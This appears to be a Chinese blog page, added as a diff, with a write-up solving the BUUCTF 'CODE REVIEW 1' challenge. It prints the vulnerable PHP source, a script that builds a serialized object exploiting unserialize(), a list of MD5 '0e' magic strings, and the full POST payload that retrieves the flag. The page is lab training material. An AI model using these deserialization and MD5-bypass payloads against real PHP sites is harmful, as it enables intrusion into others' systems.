@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="xuan tu">
+
+
+
+
+
+
+
+<title>BUU CODE REVIEW 1 1_解题记录 | 曲径通幽处.</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            ヾ(^_^) back Home.!!
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">主页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">文章</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a target="_blank" rel="noopener" href="https://drive.google.com/drive/folders/1a-OiD9e0tEgNmWDoR0RGkhBtp-v8TQq8?usp=drive_link">书阁(M)</a>
+              </li> 
+                   
+          
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
+                
+                    <span class="post-tag">
+                        <a href="/tags/CTF/">
+                            CTF
+                        </a>
+                    </span>    
+                
+                    <span class="post-tag">
+                        <a href="/tags/hackbar/">
+                            hackbar
+                        </a>
+                    </span>    
+                
+                    <span class="post-tag">
+                        <a href="/tags/MD5%E7%BB%95%E8%BF%87/">
+                            MD5绕过
+                        </a>
+                    </span>    
+                
+                    <span class="post-tag">
+                        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                            反序列化漏洞
+                        </a>
+                    </span>    
+                
+                    <span class="post-tag">
+                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                            代码审计
+                        </a>
+                    </span>    
+                           
+            
+        </div>
+        <div class="post-title">
+            
+            
+                BUU CODE REVIEW 1 1_解题记录
+            
+            
+        </div>
+        <span class="post-date">
+            4月 24, 2023
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <h2 id="BUU-CODE-REVIEW-1-1"><a href="#BUU-CODE-REVIEW-1-1" class="headerlink" title="BUU CODE REVIEW 1 1"></a>BUU CODE REVIEW 1 1</h2><p>平台：<a target="_blank" rel="noopener" href="https://buuoj.cn/">BUUCTF在线评测 (buuoj.cn)</a></p>
+<p>题目：</p>
+<p><img src="https://i.328888.xyz/2023/04/24/ioIsac.png"></p>
+<p>CODE REVIEW 意为<strong>代码审计</strong></p>
+<p>代码审计是指对程序源代码进行检查分析，发现其中的错误信息、安全隐患和规范性缺陷问题，以及针对由这些问题引发的安全漏洞，提供代码修复措施和建议。它是防御性编程范例的一个组成部分，它试图在软件发布之前减少错误。</p>
+<p>简而言之从，意思就是让你分析这段代码的功能</p>
+<p>这是一个php脚本，我们发现if后面的unserialize() </p>
+<p>unserialize() 函数将二进制数据作为参数传递给 unserialize() 函数，并返回相应的 PHP 对象。当二进制数据被加密或编码时，unserialize() 函数可以将其解码为 PHP 对象。</p>
+<p>if段内的代码是用get方法传递pleaseget变量值为1，用post方法传递pleasepost变量值为1，然后用post方法传递md51和md52的内容不同，但是md5值相同</p>
+<p>由于代码是逐行运行的，因此我们想要达到unserialize() ，首先得使其运行if段内的函数</p>
+<p>如何操作呢？？</p>
+<p>此时就需要我们利用一个php漏洞：<strong>反序列化漏洞</strong>（php对象注入）</p>
+<p>详见：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/84705">【技术分享】神奇的php反序列化-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<p>其中就涉及unserialize() 这个函数</p>
+<p>unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。返回的是转换之后的值，可为 integer、float、string、array 或 object。如果传递的字符串不可<strong>解序列化</strong>，则返回 FALSE。与之相对的函数serialize()序列化函数。</p>
+<p>序列化：是将变量转换为可保存或传输的字符串的过程 ；（编码）</p>
+<p>反序列化：就是在适当的时候把这个字符串再转化成原来的变量使用；（解码）</p>
+<p><strong>漏洞利用：</strong></p>
+<p>在本地运行代码打印出序列化后的数据</p>
+<p>例子：原题：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: jinzhao</span></span><br><span class="line"><span class="comment"> * Date: 2019/10/6</span></span><br><span class="line"><span class="comment"> * Time: 8:04 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;correct = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">uniqid</span>());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;correct === <span class="variable language_">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pleaseget&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pleasepost&#x27;</span>] === <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们在后面加一句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$obj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">BUU</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;input =&amp;<span class="variable">$obj</span>-&gt;correct;</span><br><span class="line"><span class="variable">$obj</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>变成：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;correct = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">uniqid</span>());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;correct === <span class="variable language_">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pleaseget&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pleasepost&#x27;</span>] === <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">BUU</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;input =&amp;<span class="variable">$obj</span>-&gt;correct;</span><br><span class="line"><span class="variable">$obj</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行结果形如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;BUU&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;correct&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;input&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们<strong>需要将if中满足的条件和上面的数据上传</strong>，因为要满足所有条件才可以进行反序列化</p>
+<p>我们发现条件中有md5，这就牵扯到了<strong>MD5加密漏洞</strong>，也叫md5绕过（<em>具体参见<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/848825">MD5加密漏洞(MD5绕过方式-0e绕过&#x2F;数组绕过&#x2F;MD5碰撞&#x2F;MD5SQL注入)-阿里云开发者社区 (aliyun.com)</a>）</em></p>
+<p>此处可以用到<strong>0e绕过</strong>或<strong>数组绕过</strong></p>
+<p><strong>0e绕过</strong>简而言之就是：0e开头的字符串在参与弱类型比较时,会被当做科学计数法,结果转换为0;即为  0&#x3D;&#x3D; 0，这个式子是永真的，所以我们只要传入两个md5值是以0e开头的参数,即可绕过md5加密</p>
+<p>下面这些经过md5加密后均为以0e开头</p>
+<p>   QNKCDZO</p>
+<p>   240610708</p>
+<p>   byGcY</p>
+<p>   sonZ7y</p>
+<p>   aabg7XSs</p>
+<p>   aabC9RqS</p>
+<p>   s878926199a</p>
+<p>   s155964671a</p>
+<p>   s214587387a</p>
+<p>   s1091221200a</p>
+<p>可以记录一下，具体用到几个就可以传几个</p>
+<p><strong>数组绕过</strong>：</p>
+<p>例如：</p>
+<p>md5(a[]&#x3D;1) &#x3D;&#x3D;&#x3D; md5(b[]&#x3D;1)</p>
+<p>判断时，为</p>
+<p>null&#x3D;null</p>
+<p>永真</p>
+<p>好了，介绍完md5加密，接下来继续：</p>
+<p>我们说到要将if中满足的条件和上面的数据上传，可以用hackbar这款插件，下面以火狐浏览器为例：</p>
+<p>构造条件pleaseget和pleasepost</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pleasepost=2&amp;md51=s155964671a&amp;md52=s214587387a&amp;obj=O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.328888.xyz/2023/04/27/i94Jok.png"></p>
+<p>点击execute后，回显flag</p>
+
+</div> 
+
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+                <div class="icon arrow-left"></div>
+                <div class="post-link">
+                    <a href="/2023/05/01/syber_S_learn/">Prev</a>
+                </div>
+            
+        </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2023/04/02/c++_experiment/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
+
+    
+      <div class="post-comment">
+
+     
+
+     
+
+
+    
+       <!--PC版-->
+        <div id="SOHUCS" ></div>
+        <script charset="utf-8" type="text/javascript" src="https://cy-cdn.kuaizhan.com/upload/changyan.js" ></script>
+        <script type="text/javascript">
+        window.changyan.api.config({
+            appid: 'cywJvGKKO',
+            conf: 'prod_dfd0ec91693832034dcc62943592b045'
+        });
+        </script>   
+     
+
+</div>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+    
+    
+
+  </body>
+</html>
